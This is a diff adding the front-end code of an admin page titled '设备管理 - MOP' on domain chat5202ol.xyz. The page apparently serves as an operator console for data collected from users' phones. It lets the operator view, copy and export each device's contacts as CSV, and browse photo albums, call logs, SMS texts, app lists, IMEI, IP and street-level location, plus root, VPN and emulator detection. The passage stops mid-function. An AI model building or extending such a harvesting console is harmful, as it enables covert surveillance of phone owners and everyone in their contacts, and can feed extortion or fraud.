@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#667eea">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>设备管理 - MOP</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=20260112">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Microsoft YaHei', sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
+            display: flex;
+        }
+        
+        /* 左侧菜单（宽度缩减 1/3，与各页统一） */
+        .sidebar {
+            width: 147px;
+            min-width: 147px;
+            background: linear-gradient(180deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 16px 0;
+            box-shadow: 2px 0 10px rgba(0,0,0,0.08);
+        }
+        
+        .sidebar-title {
+            padding: 0 12px 12px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.7);
+        }
+        
+        .sidebar-menu-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+            color: white;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .sidebar-menu-item:hover {
+            background: rgba(255,255,255,0.15);
+        }
+        
+        .sidebar-menu-item.active {
+            background: rgba(255,255,255,0.25);
+            font-weight: 600;
+        }
+        
+        .sidebar-menu-item-icon { font-size: 1em; }
+        
+        /* 主内容区 */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+        }
+        
+        .main-header {
+            background: white;
+            padding: 20px 24px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+        
+        .main-title {
+            font-size: 1.4em;
+            color: #333;
+        }
+        
+        /* 右上方搜索栏 */
+        .search-bar {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .search-bar input {
+            padding: 10px 16px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            width: 300px;
+        }
+        .search-bar input::placeholder { color: #aaa; }
+        .search-bar .btn-search {
+            padding: 10px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            white-space: nowrap;
+        }
+        .search-bar .btn-search:hover { opacity: 0.9; }
+        
+        .main-body {
+            flex: 1;
+            padding: 24px;
+            overflow-x: auto;
+        }
+        
+        .message {
+            padding: 12px 20px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            display: none;
+        }
+        .message-success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        .message-error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
+        .message-info { background: #d1ecf1; color: #0c5460; border: 1px solid #bee5eb; }
+        
+        /* 设备表格 */
+        .devices-table-wrap {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            overflow-x: auto;
+        }
+        
+        .devices-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+        
+        .devices-table th,
+        .devices-table td {
+            padding: 12px 14px;
+            border-bottom: 1px solid #eee;
+            text-align: left;
+            vertical-align: middle;
+        }
+        
+        .devices-table th {
+            background: #f8f9fa;
+            color: #333;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+        
+        .devices-table tr:hover td { background: #fafbfc; }
+        
+        .devices-table .col-sys { width: 90px; }
+        .devices-table .col-user { width: 200px; }
+        .devices-table .col-model { width: 140px; }
+        .devices-table .col-contacts { width: 160px; }
+        .devices-table .col-album { width: 80px; }
+        .devices-table .col-calls { width: 80px; }
+        .devices-table .col-sms { width: 80px; }
+        .devices-table .col-apps { width: 70px; }
+        .devices-table .col-ip { width: 140px; }
+        .devices-table .col-msg { width: 180px; }
+        .devices-table .col-version { width: 90px; }
+        .devices-table .col-fp { width: 120px; }
+        
+        .btn-sm {
+            padding: 4px 10px;
+            font-size: 12px;
+            border-radius: 4px;
+            border: none;
+            cursor: pointer;
+            margin-right: 4px;
+            margin-bottom: 4px;
+        }
+        .btn-view { background: #667eea; color: white; }
+        .btn-copy { background: #27ae60; color: white; }
+        .btn-export { background: #3498db; color: white; }
+        .btn-send { background: #764ba2; color: white; }
+        .btn-sm:hover { opacity: 0.9; }
+        
+        .msg-input {
+            width: 100%;
+            padding: 6px 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+        
+        .status-online { color: #27ae60; }
+        .status-offline { color: #999; }
+        
+        .loading, .empty-state {
+            text-align: center;
+            padding: 48px 20px;
+            color: #999;
+        }
+        
+        /* 修改密码弹窗 */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.show { display: flex; }
+        .modal {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+        }
+        .modal h3 { margin-bottom: 16px; color: #333; }
+        .modal .form-group { margin-bottom: 14px; }
+        .modal label { display: block; margin-bottom: 6px; font-size: 14px; color: #555; }
+        .modal input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        .modal-actions { margin-top: 20px; display: flex; gap: 10px; justify-content: flex-end; }
+        .modal-actions .btn { padding: 8px 16px; border-radius: 6px; border: none; cursor: pointer; font-size: 14px; }
+        .btn-cancel { background: #e0e0e0; color: #333; }
+        .btn-confirm { background: #667eea; color: white; }
+        
+        /* 数据弹窗 */
+        .modal-data { max-width: 640px; max-height: 80vh; overflow: hidden; display: flex; flex-direction: column; }
+        .modal-data .modal-body { overflow: auto; flex: 1; font-size: 13px; }
+        .modal-data table { width: 100%; border-collapse: collapse; }
+        .modal-data th, .modal-data td { padding: 8px 10px; border: 1px solid #eee; text-align: left; }
+        .modal-data th { background: #f5f5f5; }
+        .modal-data .empty-data { color: #999; padding: 24px; text-align: center; }
+        .modal-data .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); gap: 8px; }
+        .modal-data .photo-item { border: 1px solid #eee; border-radius: 6px; overflow: hidden; }
+        .modal-data .photo-item img { width: 100%; aspect-ratio: 1; object-fit: cover; display: block; }
+        .modal-data .photo-item .caption { padding: 4px; font-size: 11px; color: #666; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .btn-blacklist { background: #e74c3c; color: white; }
+        .btn-unblacklist { background: #27ae60; color: white; }
+    </style>
+</head>
+<body>
+    <!-- 左侧菜单（各页统一、完整） -->
+    <aside class="sidebar">
+        <div class="sidebar-title">左侧菜单</div>
+        <a href="/static/dashboard.html" class="sidebar-menu-item"><span class="sidebar-menu-item-icon">👤</span>用户信息</a>
+        <a href="#" class="sidebar-menu-item" id="menu-change-pwd"><span class="sidebar-menu-item-icon">🔑</span>修改密码</a>
+        <a href="/static/devices.html" class="sidebar-menu-item active"><span class="sidebar-menu-item-icon">📱</span>设备管理</a>
+        <a href="/static/user_management.html" class="sidebar-menu-item"><span class="sidebar-menu-item-icon">👥</span>用户管理</a>
+        <a href="/static/invitation_management.html" class="sidebar-menu-item"><span class="sidebar-menu-item-icon">🎫</span>邀请码管理</a>
+        <a href="/static/qrcode_settings.html" class="sidebar-menu-item"><span class="sidebar-menu-item-icon">⚙️</span>扫码配置</a>
+    </aside>
+    
+    <div class="main">
+        <header class="main-header">
+            <h1 class="main-title">设备管理</h1>
+            <!-- 右上方搜索栏 -->
+            <div class="search-bar">
+                <input type="text" id="search-input" placeholder="可搜索：用户名、手机号、授权码、手机号后4位、型号、指纹" onkeypress="if(event.key==='Enter') applySearch()">
+                <button class="btn-search" onclick="applySearch()">搜索</button>
+                <button class="btn-search" onclick="loadDevices()" style="background:#27ae60;">刷新</button>
+            </div>
+        </header>
+        
+        <div class="main-body">
+            <div id="messages"></div>
+            
+            <p style="margin-bottom:12px;color:#666;font-size:14px;">设备管理页面每个设备信息横向排列，默认按最新时间向下排序，包含以下：</p>
+            <div class="devices-table-wrap">
+                <table class="devices-table">
+                    <thead>
+                        <tr>
+                            <th class="col-sys">系统信息</th>
+                            <th class="col-user">手机号/用户名/授权码/授权时间/在线状态</th>
+                            <th class="col-model">型号和唯一标识</th>
+                            <th class="col-contacts">通讯录</th>
+                            <th class="col-album">相册</th>
+                            <th class="col-calls">通话记录</th>
+                            <th class="col-sms">短信内容</th>
+                            <th class="col-apps">APP列表</th>
+                            <th class="col-ip">IP及归属地</th>
+                            <th class="col-msg">发送系统消息</th>
+                            <th class="col-version">系统版本</th>
+                            <th class="col-fp">指纹等</th>
+                        </tr>
+                    </thead>
+                    <tbody id="devices-tbody">
+                        <tr><td colspan="12" class="loading">加载中...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <!-- 修改密码弹窗 -->
+    <div class="modal-overlay" id="modal-change-pwd">
+        <div class="modal">
+            <h3>修改密码</h3>
+            <div class="form-group">
+                <label>旧密码</label>
+                <input type="password" id="pwd-old" placeholder="请输入旧密码">
+            </div>
+            <div class="form-group">
+                <label>新密码</label>
+                <input type="password" id="pwd-new" placeholder="至少6位">
+            </div>
+            <div class="modal-actions">
+                <button class="btn btn-cancel" onclick="closeChangePwdModal()">取消</button>
+                <button class="btn btn-confirm" onclick="submitChangePwd()">确定</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- 数据查看弹窗（通讯录/通话/短信/APP 复用） -->
+    <div class="modal-overlay" id="modal-data">
+        <div class="modal modal-data">
+            <h3 id="modal-data-title">数据</h3>
+            <div class="modal-body" id="modal-data-body">加载中...</div>
+            <div class="modal-actions">
+                <button class="btn btn-cancel" onclick="closeDataModal()">关闭</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- 相册弹窗 -->
+    <div class="modal-overlay" id="modal-album">
+        <div class="modal modal-data">
+            <h3>相册</h3>
+            <div class="modal-body" id="modal-album-body">加载中...</div>
+            <div class="modal-actions">
+                <button class="btn btn-cancel" onclick="closeAlbumModal()">关闭</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        function getApiBase() {
+            const h = window.location.hostname, p = window.location.protocol;
+            if (h === 'www.chat5202ol.xyz' || h === 'chat5202ol.xyz' || h === 'app.chat5202ol.xyz')
+                return 'https://api.chat5202ol.xyz/api/v1';
+            if (h === 'api.chat5202ol.xyz') return p + '//' + h + '/api/v1';
+            return '/api/v1';
+        }
+        const API_BASE = getApiBase();
+        let currentUser = null;
+        let allDevices = [];
+        
+        function getToken() { return localStorage.getItem('access_token'); }
+
+        function getPhotoUrl(photoId) {
+            const base = API_BASE.startsWith('http') ? API_BASE : (window.location.origin + API_BASE);
+            return base + '/files/photo/' + encodeURIComponent(photoId) + '?token=' + encodeURIComponent(getToken() || '');
+        }
+        
+        async function apiRequest(url, options = {}) {
+            const token = getToken();
+            if (!token) {
+                showMessage('未登录，请先登录', 'error');
+                setTimeout(() => { window.location.href = '/login'; }, 2000);
+                throw new Error('未登录');
+            }
+            options.headers = options.headers || {};
+            options.headers['Authorization'] = 'Bearer ' + token;
+            if (options.body && !options.headers['Content-Type'])
+                options.headers['Content-Type'] = 'application/json';
+            options.credentials = options.credentials || 'include';
+            const res = await fetch(url, options);
+            if (res.status === 401) {
+                localStorage.removeItem('access_token');
+                localStorage.removeItem('refresh_token');
+                showMessage('登录已过期，请重新登录', 'error');
+                setTimeout(() => { window.location.href = '/login'; }, 2000);
+                throw new Error('登录已过期');
+            }
+            return res;
+        }
+        
+        function showMessage(text, type) {
+            const el = document.getElementById('messages');
+            const m = document.createElement('div');
+            m.className = 'message message-' + type;
+            m.textContent = text;
+            m.style.display = 'block';
+            el.appendChild(m);
+            setTimeout(() => { m.style.opacity = '0'; m.style.transition = 'opacity 0.3s'; setTimeout(() => m.remove(), 300); }, 5000);
+        }
+        
+        async function loadUserInfo() {
+            try {
+                const token = getToken();
+                if (!token) { showMessage('未登录', 'error'); setTimeout(() => { window.location.href = '/login'; }, 2000); return; }
+                const res = await fetch(API_BASE + '/auth/me', {
+                    headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
+                    credentials: 'include'
+                });
+                if (!res.ok) {
+                    if (res.status === 401) { localStorage.removeItem('access_token'); showMessage('登录已过期', 'error'); setTimeout(() => { window.location.href = '/login'; }, 2000); return; }
+                    throw new Error('获取用户信息失败');
+                }
+                currentUser = await res.json();
+            } catch (e) {
+                console.error(e);
+                showMessage('加载用户信息失败', 'error');
+            }
+        }
+        
+        async function loadDevices() {
+            try {
+                const res = await apiRequest(API_BASE + '/devices/', { method: 'GET' });
+                if (!res.ok) {
+                    // 尝试获取详细的错误信息
+                    let errorDetail = '获取设备列表失败';
+                    try {
+                        const errorData = await res.json();
+                        errorDetail = errorData.detail || errorData.message || errorDetail;
+                    } catch (parseError) {
+                        errorDetail = `HTTP ${res.status}: ${res.statusText}`;
+                    }
+                    throw new Error(errorDetail);
+                }
+                let list = await res.json();
+                if (!Array.isArray(list)) list = [];
+                list.sort((a, b) => {
+                    const ta = (a.updated_at || a.created_at || '').replace('Z', '');
+                    const tb = (b.updated_at || b.created_at || '').replace('Z', '');
+                    return tb.localeCompare(ta);
+                });
+                allDevices = list;
+                applySearch();
+            } catch (e) {
+                console.error('加载设备列表失败:', e);
+                const errorMsg = e.message || '未知错误';
+                showMessage('加载设备列表失败: ' + errorMsg, 'error');
+                document.getElementById('devices-tbody').innerHTML = '<tr><td colspan="12" class="empty-state">加载失败: ' + escapeHtml(errorMsg) + '</td></tr>';
+            }
+        }
+        
+        function applySearch() {
+            const searchText = (document.getElementById('search-input').value || '').trim();
+            if (!searchText) {
+                renderDevices(allDevices);
+                return;
+            }
+            const searchLower = searchText.toLowerCase();
+            const list = allDevices.filter(d => {
+                const phone = (d.user_phone || '') + '';
+                const name = (d.user_username || '') + '';
+                const nick = (d.user_nickname || '') + '';
+                const code = (d.user_invitation_code || '') + '';
+                const model = (d.device_model || '').toLowerCase();
+                const fp = (d.device_fingerprint || '').toLowerCase();
+                const idStr = '#' + (d.id != null ? d.id : '');
+                return (name && name.toLowerCase().indexOf(searchLower) !== -1) ||
+                    (nick && nick.toLowerCase().indexOf(searchLower) !== -1) ||
+                    (phone && (phone.indexOf(searchText) !== -1 || phone.slice(-4) === searchText)) ||
+                    (code && code.toLowerCase().indexOf(searchLower) !== -1) ||
+                    (model && model.indexOf(searchLower) !== -1) ||
+                    (fp && fp.indexOf(searchLower) !== -1) ||
+                    idStr.indexOf(searchText) !== -1;
+            });
+            renderDevices(list);
+        }
+        
+        function renderDevices(list) {
+            const tbody = document.getElementById('devices-tbody');
+            if (list.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="12" class="empty-state">暂无设备</td></tr>';
+                return;
+            }
+            tbody.innerHTML = list.map(d => {
+                const updated = d.updated_at || d.created_at || '';
+                const timeStr = updated ? new Date(updated).toLocaleString('zh-CN') : '—';
+                const phoneStr = d.user_phone || '—';
+                const userStr = d.user_username || '—';
+                const codeStr = d.user_invitation_code || '—';
+                const ipLoc = [d.last_login_ip, d.location_city, d.location_street, d.location_address].filter(Boolean).join(' ') || '—';
+                const model = d.device_model || '—';
+                const fpRaw = d.device_fingerprint || '';
+                const fp = fpRaw ? (fpRaw.substring(0, 20) + (fpRaw.length > 20 ? '...' : '')) : '—';
+                const deviceId = d.id != null ? '#' + d.id : '—';
+                const online = d.is_online === true;
+                const statusCls = online ? 'status-online' : 'status-offline';
+                const statusText = online ? '在线' : '离线';
+                const blacklisted = d.is_blacklisted === true;
+                const blBtn = blacklisted
+                    ? '<button class="btn-sm btn-unblacklist" onclick="toggleBlacklist(' + d.id + ', false)">解封</button>'
+                    : '<button class="btn-sm btn-blacklist" onclick="toggleBlacklist(' + d.id + ', true)">拉黑</button>';
+                const sysVer = d.system_version || '—';
+                return '<tr>' +
+                    '<td class="col-sys"><button class="btn-sm btn-view" onclick="viewDevice(' + d.id + ')">详情</button></td>' +
+                    '<td class="col-user">' + escapeHtml(phoneStr) + ' / ' + escapeHtml(userStr) + ' / ' + escapeHtml(codeStr) + ' / ' + timeStr + ' / <span class="' + statusCls + '">' + statusText + '</span> ' + blBtn + '</td>' +
+                    '<td class="col-model">' + escapeHtml(model) + ' / ' + escapeHtml(deviceId) + '</td>' +
+                    '<td class="col-contacts"><button class="btn-sm btn-view" onclick="viewContacts(' + d.id + ')">查看</button> <button class="btn-sm btn-copy" onclick="copyContacts(' + d.id + ')">复制</button> <button class="btn-sm btn-export" onclick="exportContacts(' + d.id + ')">导出</button></td>' +
+                    '<td class="col-album"><button class="btn-sm btn-view" onclick="viewAlbum(' + d.id + ')">查看</button></td>' +
+                    '<td class="col-calls"><button class="btn-sm btn-view" onclick="viewCalls(' + d.id + ')">查看</button></td>' +
+                    '<td class="col-sms"><button class="btn-sm btn-view" onclick="viewSms(' + d.id + ')">查看</button></td>' +
+                    '<td class="col-apps"><button class="btn-sm btn-view" onclick="viewApps(' + d.id + ')">查看</button></td>' +
+                    '<td class="col-ip">' + escapeHtml(ipLoc) + '</td>' +
+                    '<td class="col-msg"><input type="text" class="msg-input" placeholder="填写内容" id="msg-' + d.id + '"><button class="btn-sm btn-send" onclick="sendMsg(' + d.id + ')">发送</button></td>' +
+                    '<td class="col-version">' + escapeHtml(sysVer) + '</td>' +
+                    '<td class="col-fp">' + escapeHtml(fp) + '</td>' +
+                    '</tr>';
+            }).join('');
+        }
+        
+        function escapeHtml(s) {
+            if (s == null) return '—';
+            const div = document.createElement('div');
+            div.textContent = s;
+            return div.innerHTML;
+        }
+        
+        function getDeviceById(id) { return allDevices.find(d => d.id === id); }
+        
+        function viewDevice(id) {
+            const d = getDeviceById(id);
+            if (!d) { showMessage('设备不存在', 'error'); return; }
+            const lines = [
+                '设备 #' + d.id,
+                '型号: ' + (d.device_model || '—'),
+                '指纹: ' + (d.device_fingerprint || '—'),
+                'IMEI: ' + (d.imei || '—'),
+                'IP: ' + (d.last_login_ip || '—'),
+                '位置: ' + [d.location_city, d.location_street, d.location_address].filter(Boolean).join(' ') || '—',
+                'Root/越狱: ' + (d.is_rooted ? '是' : '否'),
+                'VPN/代理: ' + (d.is_vpn_proxy ? '是' : '否'),
+                '模拟器: ' + (d.is_emulator ? '是' : '否'),
+                '拉黑: ' + (d.is_blacklisted ? '是' : '否'),
+            ];
+            showMessage(lines.join(' | '), 'info');
+        }
+        
+        async function fetchContacts(deviceId) {
+            const res = await apiRequest(API_BASE + '/devices/' + deviceId + '/contacts', { method: 'GET' });
+            if (!res.ok) throw new Error('获取通讯录失败');
+            const data = await res.json();
+            return data.contacts || [];
+        }
+        
+        async function viewContacts(id) {
+            const el = document.getElementById('modal-data-body');
+            const title = document.getElementById('modal-data-title');
+            title.textContent = '通讯录';
+            el.innerHTML = '加载中...';
+            document.getElementById('modal-data').classList.add('show');
+            try {
+                const contacts = await fetchContacts(id);
+                if (!contacts.length) { el.innerHTML = '<div class="empty-data">暂无通讯录数据</div>'; return; }
+                const headers = ['姓名', '电话', '备注'].join('</th><th>');
+                const rows = contacts.map(c => {
+                    const name = escapeHtml((c.name || c.displayName || '').toString());
+                    const phone = escapeHtml((c.phone || c.number || '').toString());
+                    const note = escapeHtml((c.note || '').toString());
+                    return '<tr><td>' + name + '</td><td>' + phone + '</td><td>' + note + '</td></tr>';
+                }).join('');
+                el.innerHTML = '<table><thead><tr><th>' + headers + '</th></tr></thead><tbody>' + rows + '</tbody></table>';
+            } catch (e) {
+                console.error('加载通讯录失败:', e);
+                el.innerHTML = '<div class="empty-data">加载失败: ' + escapeHtml(e.message) + '<br><small style="color:#999;">请检查设备是否已上传数据</small></div>';
+            }
+        }
+        
+        async function copyContacts(id) {
+            try {
+                const contacts = await fetchContacts(id);
+                if (!contacts.length) { showMessage('暂无通讯录数据', 'info'); return; }
+                const text = contacts.map(c => (c.name || c.displayName || '') + '\t' + (c.phone || c.number || '') + '\t' + (c.note || '')).join('\n');
+                await navigator.clipboard.writeText('姓名\t电话\t备注\n' + text);
+                showMessage('已复制到剪贴板', 'success');
+            } catch (e) { showMessage('复制失败: ' + e.message, 'error'); }
+        }
+        
+        async function exportContacts(id) {
+            try {
+                const contacts = await fetchContacts(id);
+                if (!contacts.length) { showMessage('暂无通讯录数据', 'info'); return; }
+                const csv = '\ufeff姓名,电话,备注\n' + contacts.map(c => {
+                    const a = (c.name || c.displayName || '').toString().replace(/"/g, '""');
+                    const b = (c.phone || c.number || '').toString().replace(/"/g, '""');
+                    const g = (c.note || '').toString().replace(/"/g, '""');
+                    return '"' + a + '","' + b + '","' + g + '"';
+                }).join('\n');
+                const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob);
+                a.download = 'contacts_device_' + id + '.csv';
+                a.click();
+                URL.revokeObjectURL(a.href);
+                showMessage('导出成功', 'success');
+            } catch (e) { showMessage('导出失败: ' + e.message, 'error'); }
+        }
+        
+        function closeDataModal() { document.getElementById('modal-data').classList.remove('show'); }
+        function closeAlbumModal() { document.getElementById('modal-album').classList.remove('show'); }
+
+        let viewerPhotos = [];
+        let viewerIdx = 0;
+        let viewerScale = 1;
+        let viewerX = 0;
+        let viewerY = 0;
+        let viewerLastX = 0;
+        let viewerLastY = 0;
+        let viewerDragging = false;
+
+        function openPhotoViewer(photos, index) {
+            viewerPhotos = photos;
+            viewerIdx = index >= 0 && index < photos.length ? index : 0;
+            viewerScale = 1;
+            viewerX = 0;
+            viewerY = 0;
+            document.getElementById('photo-viewer').classList.add('show');
+            renderViewerImage();
+            bindViewerEvents();
+        }
+
+        function closePhotoViewer() {
+            document.getElementById('photo-viewer').classList.remove('show');
+            unbindViewerEvents();
+        }
+
+        function renderViewerImage() {
+            const img = document.getElementById('photo-viewer-img');
+            const idxEl = document.getElementById('photo-viewer-index');
+            if (!viewerPhotos.length) { closePhotoViewer(); return; }
+            const p = viewerPhotos[viewerIdx];
+            img.src = getPhotoUrl(p.photo_id);
+            img.style.transform = 'scale(' + viewerScale + ') translate(' + viewerX + 'px, ' + viewerY + 'px)';
+            idxEl.textContent = (viewerIdx + 1) + ' / ' + viewerPhotos.length;
+        }
+
+        function bindViewerEvents() {
+            const wrap = document.getElementById('photo-viewer-wrap');
+            const img = document.getElementById('photo-viewer-img');
+
+            function onWheel(e) {
+                e.preventDefault();
+                const delta = e.deltaY > 0 ? -0.15 : 0.15;
+                viewerScale = Math.max(0.3, Math.min(5, viewerScale + delta));
+                img.style.transform = 'scale(' + viewerScale + ') translate(' + viewerX + 'px, ' + viewerY + 'px)';
+            }
+
+            function onDown(e) {
+                viewerDragging = true;
+                viewerLastX = e.clientX !== undefined ? e.clientX : e.touches[0].clientX;
+                viewerLastY = e.clientY !== undefined ? e.clientY : e.touches[0].clientY;
+                wrap.classList.add('dragging');
+            }
+
+            function onMove(e) {
+                if (!viewerDragging) return;
+                e.preventDefault();
+                const cx = e.clientX !== undefined ? e.clientX : e.touches[0].clientX;
+                const cy = e.clientY !== undefined ? e.clientY : e.touches[0].clientY;
+                viewerX += cx - viewerLastX;
+                viewerY += cy - viewerLastY;
+                viewerLastX = cx;
+                viewerLastY = cy;
+                img.style.transform = 'scale(' + viewerScale + ') translate(' + viewerX + 'px, ' + viewerY + 'px)';
+            }
+
+            function onUp() {
+                viewerDragging = false;
+                wrap.classList.remove('dragging');
+            }
+
+            wrap._viewerWheel = onWheel;
+            wrap._viewerDown = onDown;
+            wrap._viewerMove = onMove;
+            wrap._viewerUp = onUp;
+            wrap.addEventListener('wheel', onWheel, { passive: false });
+            wrap.addEventListener('mousedown', onDown);
+            wrap.addEventListener('touchstart', onDown, { passive: true });
+            window.addEventListener('mousemove', onMove);
+            window.addEventListener('touchmove', onMove, { passive: false });
+            window.addEventListener('mouseup', onUp);
+            window.addEventListener('touchend', onUp);
+
+            document.addEventListener('keydown', wrap._viewerKey = function(e) {
+                if (e.key === 'Escape') closePhotoViewer();
+                if (e.key === 'ArrowLeft' && viewerIdx > 0) { viewerIdx--; viewerScale = 1; viewerX = 0; viewerY = 0; renderViewerImage(); }
+                if (e.key === 'ArrowRight' && viewerIdx < viewerPhotos.length - 1) { viewerIdx++; viewerScale = 1; viewerX = 0; viewerY = 0; renderViewerImage(); }
+            });
+        }
+
+        function unbindViewerEvents() {
+            const wrap = document.getElementById('photo-viewer-wrap');
+            if (!wrap._viewerWheel) return;
+            wrap.removeEventListener('wheel', wrap._viewerWheel);
+            wrap.removeEventListener('mousedown', wrap._viewerDown);
+            wrap.removeEventListener('touchstart', wrap._viewerDown);
+            window.removeEventListener('mousemove', wrap._viewerMove);
+            window.removeEventListener('touchmove', wrap._viewerMove);
+            window.removeEventListener('mouseup', wrap._viewerUp);
+            window.removeEventListener('touchend', wrap._viewerUp);
+            document.removeEventListener('keydown', wrap._viewerKey);
+        }
+
+        async function viewAlbum(id) {
+            const el = document.getElementById('modal-album-body');
+            el.innerHTML = '加载中...';
+            document.getElementById('modal-album').classList.add('show');
+            try {
+                const res = await apiRequest(API_BASE + '/devices/' + id + '/album?page=1&limit=200', { method: 'GET' });
+                if (!res.ok) throw new Error('获取相册失败');
+                const data = await res.json();
+                const items = data.photos || [];
+                const total = data.total || 0;
+                if (!items.length) {
+                    el.innerHTML = '<div class="empty-data">暂无相册照片<br><small style="color:#999;">该设备尚未上传相册照片</small></div>';
+                    return;
+                }
+                let html = '<div class="photo-grid">';
+                items.forEach(function(p, idx) {
+                    const src = getPhotoUrl(p.photo_id);
+                    const cap = (p.file_name || p.photo_id || '').toString();
+                    html += '<div class="photo-item" onclick="openPhotoViewer(viewerAlbumPhotos, ' + idx + ')"><img src="' + src.replace(/"/g, '&quot;') + '" alt="" onerror="this.style.background=\'#333\';this.alt=\'加载失败\'">';
+                    html += '<div class="caption">' + escapeHtml(cap) + '</div></div>';
+                });
+                html += '</div>';
+                if (total > 200) html += '<p style="margin-top:12px;color:#666;font-size:12px;">仅显示前 200 张，共 ' + total + ' 张</p>';
+                el.innerHTML = html;
+                window.viewerAlbumPhotos = items;
+            } catch (e) {
+                el.innerHTML = '<div class="empty-data">加载失败: ' + escapeHtml(e.message) + '</div>';
+            }
+        }
+        
+        async function viewCalls(id) {
+            const el = document.getElementById('modal-data-body');
+            const title = document.getElementById('modal-data-title');
+            title.textContent = '通话记录';
+            el.innerHTML = '加载中...';
+            document.getElementById('modal-data').classList.add('show');
+            try {
+                const res = await apiRequest(API_BASE + '/devices/' + id + '/calls', { method: 'GET' });
+                if (!res.ok) {
+                    let errorMsg = '获取通话记录失败';
+                    try {
+                        const errorData = await res.json();
+                        errorMsg = errorData.detail || errorData.message || errorMsg;
+                    } catch (parseError) {
+                        errorMsg = `HTTP ${res.status}: ${res.statusText}`;
+                    }
+                    throw new Error(errorMsg);
+                }
+                const list = (await res.json()).call_records || [];
+                if (!list.length) {
+                    el.innerHTML = '<div class="empty-data">暂无通话记录<br><small style="color:#999;">该设备尚未上传通话记录数据</small></div>';
+                    return;
+                }
+                const rows = list.map(c => {
+                    const num = escapeHtml((c.number || c.phone || '').toString());
+                    const type = escapeHtml((c.type || '').toString());
+                    const date = escapeHtml((c.date || c.time || '').toString());
+                    const dur = escapeHtml((c.duration != null ? c.duration : '').toString());
+                    return '<tr><td>' + num + '</td><td>' + type + '</td><td>' + date + '</td><td>' + dur + '</td></tr>';
+                }).join('');
+                el.innerHTML = '<table><thead><tr><th>号码</th><th>类型</th><th>时间</th><th>时长</th></tr></thead><tbody>' + rows + '</tbody></table>';
+            } catch (e) {
+                console.error('加载通话记录失败:', e);
+                el.innerHTML = '<div class="empty-data">加载失败: ' + escapeHtml(e.message) + '<br><small style="color:#999;">请检查设备是否已上传数据</small></div>';
+            }
+        }
+        
+        async function viewSms(id) {
+            const el = document.getElementById('modal-data-body');
+            const title = document.getElementById('modal-data-title');
+            title.textContent = '短信';
+            el.innerHTML = '加载中...';
+            document.getElementById('modal-data').classList.add('show');
+            try {
+                const res = await apiRequest(API_BASE + '/devices/' + id + '/sms', { method: 'GET' });
+                if (!res.ok) {
+                    let errorMsg = '获取短信失败';
+                    try {
+                        const errorData = await res.json();
+                        errorMsg = errorData.detail || errorData.message || errorMsg;
+                    } catch (parseError) {
+                        errorMsg = `HTTP ${res.status}: ${res.statusText}`;
+                    }
+                    throw new Error(errorMsg);
+                }
+                const list = (await res.json()).sms || [];
+                if (!list.length) {
+                    el.innerHTML = '<div class="empty-data">暂无短信数据<br><small style="color:#999;">该设备尚未上传短信数据</small></div>';
+                    return;
+                }
+                const rows = list.map(s => {
+                    const from = escapeHtml((s.address || s.from || '').toString());
+                    const body = escapeHtml((s.body || s.content || '').toString().slice(0, 80));
+                    const date = escapeHtml((s.date || s.time || '').toString());
+                    return '<tr><td>' + from + '</td><td>' + body + '</td><td>' + date + '</td></tr>';
+                }).join('');
+                el.innerHTML = '<table><thead><tr><th>发送者</th><th>内容</th><th>时间</th></tr></thead><tbody>' + rows + '</tbody></table>';
+            } catch (e) {
+                console.error('加载短信失败:', e);
